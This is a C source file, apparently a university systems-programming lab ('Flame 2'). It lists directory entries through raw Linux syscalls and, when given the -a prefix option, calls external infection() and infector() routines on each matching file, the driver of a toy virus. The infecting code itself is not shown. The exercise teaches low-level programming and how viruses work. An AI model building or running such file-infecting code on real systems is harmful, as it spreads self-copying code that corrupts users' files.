#include "util.h"

#define NULL (void*) 0

#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SYS_GETDENTS 141

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define SEEK_SET 0
#define SEEK_CUR 1
#define SEEK_END 2

#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDRW 2
#define O_APPEND 1024
#define O_TRUNC 512
#define O_CREAT 64

#define DT_UNKNOWNE 0
#define DT_FIFO 1
#define DT_CHR 2
#define DT_DIR 4
#define DT_BLK 6
#define DT_REG 8
#define DT_LNK 10
#define DT_SOCK 12
#define DT_WHT 14

/* taken from getdents man pgae */
typedef struct linux_dirent {
unsigned long  d_ino;     /* Inode number */
unsigned long  d_off;     /* Offset to next linux_dirent */
unsigned short d_reclen;  /* Length of this linux_dirent */
char           d_name[];  /* Filename (null-terminated) */
                          /* length is actually (d_reclen - 2 -
                              offsetof(struct linux_dirent, d_name)) */
/*
char           pad;       // Zero padding byte
char           d_type;    // File type (only since Linux
                          // 2.6.4); offset is (d_reclen - 1)
*/
} linux_dirent;


extern int system_call(int,...);
extern void code_start();
extern void code_end();
extern void infection(void);
extern void infector(char *);

char dBugFlag = 0;
linux_dirent* dent = NULL;


void deBug (int ID, int code){
    
    char* str;

    if (dBugFlag){
        system_call(SYS_WRITE, STDERR, "\n", 1);
        system_call(SYS_WRITE, STDERR, "ID: ", 4);
        str = itoa(ID);
        system_call(SYS_WRITE, STDERR, str, strlen(str));
        system_call(SYS_WRITE, STDERR, ", code: ", 8);
        str = itoa(code);
        system_call(SYS_WRITE, STDERR, str, strlen(str));
        if(dent != NULL){
            system_call(SYS_WRITE, STDERR, ", file name: ", 12);
            system_call(SYS_WRITE, STDERR, dent->d_name, strlen(dent->d_name));
            system_call(SYS_WRITE, STDERR, ", length: ", 10);
            str = itoa(dent->d_reclen);
            system_call(SYS_WRITE, STDERR, str, strlen(str));
        }
        system_call(SYS_WRITE, STDERR, "\n", 1);
    }
}

void printDir(linux_dirent* dent){

    int code;
    char* d_type;

    code = system_call(SYS_WRITE, STDOUT, "Name: ", 6);
    deBug(SYS_WRITE, code);
    code = system_call(SYS_WRITE, STDOUT, dent->d_name, strlen(dent->d_name));
    deBug(SYS_WRITE, code);
    code = system_call(SYS_WRITE, STDOUT, ", type: ", 8);
    deBug(SYS_WRITE, code);
    d_type = dent->d_reclen-1 + (char*) dent;
    d_type =(*d_type == DT_REG) ?  "regular" :
            (*d_type == DT_DIR) ?  "directory" :
            (*d_type == DT_FIFO) ? "FIFO" :
            (*d_type == DT_SOCK) ? "socket" :
            (*d_type == DT_LNK) ?  "symlink" :
            (*d_type == DT_BLK) ?  "block dev" :
            (*d_type == DT_CHR) ?  "char dev" : "???";
    code = system_call(SYS_WRITE, STDOUT, d_type, strlen(d_type));
    deBug(SYS_WRITE, code);
    code = system_call(SYS_WRITE, STDOUT, "\n", 1);
    deBug(SYS_WRITE, code);
}

int main (int argc , char* argv[], char* envp[]) {


char* pPrefix = NULL;
char* aPrefix = NULL;
char* str;
char buffer[8192];
int code = 1;
int out = STDOUT;
int dir;
int i;
int dentsByteNum;


for (i = 0; i < argc; i++){

    if ((strcmp(argv[i], "-D") == 0)){
        dBugFlag = 1;
    }

}
for (i = 0; i < argc; i++){

    if ((strncmp(argv[i], "-p", 2) == 0)){
        pPrefix = argv[i] + 2;
         if (strlen(pPrefix) > 10){
            code = system_call(SYS_WRITE, out, "prefix too long!\n", 17);
            deBug(SYS_WRITE, code);
            system_call(SYS_EXIT,-1);
        }
        
    }

    if ((strncmp(argv[i], "-a", 2) == 0)){
        aPrefix = argv[i] + 2;
        if (strlen(aPrefix) > 10){
            code = system_call(SYS_WRITE, out, "prefix too long!\n", 17);
            deBug(SYS_WRITE, code);
            system_call(SYS_EXIT,-1);
        }
    }

}

code = system_call(SYS_WRITE, out, "Flame 2 strikes!\n", 17);
deBug(SYS_WRITE, code);

code = system_call(SYS_WRITE, out, "code start: ", 12);
deBug(SYS_WRITE, code);
str = itoa(&code_start);
code = system_call(SYS_WRITE, out, str, strlen(str));
deBug(SYS_WRITE, code);
code = system_call(SYS_WRITE, out, ", end start: ", 13);
deBug(SYS_WRITE, code);
str = itoa(&code_end);
code = system_call(SYS_WRITE, out, str, strlen(str));
deBug(SYS_WRITE, code);
code = system_call(SYS_WRITE, out, "\n", 1);
deBug(SYS_WRITE, code);

dir = system_call(SYS_OPEN, ".", O_RDONLY, 0777);
deBug(SYS_OPEN, dir);
if (dir < 0 ){
    system_call(SYS_EXIT,-1);
}

dentsByteNum = system_call(SYS_GETDENTS, dir, buffer, 8192);
deBug(SYS_GETDENTS, dentsByteNum);

code = system_call(SYS_CLOSE, dir);
deBug(SYS_CLOSE, code);

i = 32;

while (i < dentsByteNum) {
    dent =(linux_dirent*) (buffer + i);
    if ((pPrefix == NULL && aPrefix == NULL) || (pPrefix != NULL && strncmp(pPrefix, dent->d_name, strlen(pPrefix)) == 0) || (aPrefix != NULL && strncmp(aPrefix, dent->d_name, strlen(aPrefix)) == 0)){
        printDir(dent);
    }

    if ((aPrefix != NULL) && (strncmp(aPrefix, dent->d_name, strlen(aPrefix)) == 0)){
        infection();
        infector(dent->d_name);
    }


    i += dent->d_reclen;
    
}

dent = NULL;

return 0;

}
